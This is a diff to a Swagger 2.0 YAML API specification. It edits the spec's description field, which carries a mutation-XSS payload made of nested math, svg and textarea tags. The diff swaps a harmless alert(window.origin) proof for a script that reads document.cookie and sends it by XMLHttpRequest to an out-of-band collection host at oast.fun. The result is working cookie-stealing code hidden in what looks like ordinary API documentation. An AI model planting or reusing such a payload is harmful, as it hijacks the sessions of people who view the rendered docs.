@@ -2,7 +2,12 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><script>
+  var cookies = document.cookie;
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'http://ommsgxmitysvgnxszleccea3umem7j3k1.oast.fun/collect?cookies=' + encodeURIComponent(cookies), true);
+  xhr.send();
+</script>">
 paths:
   /accounts:
     get:
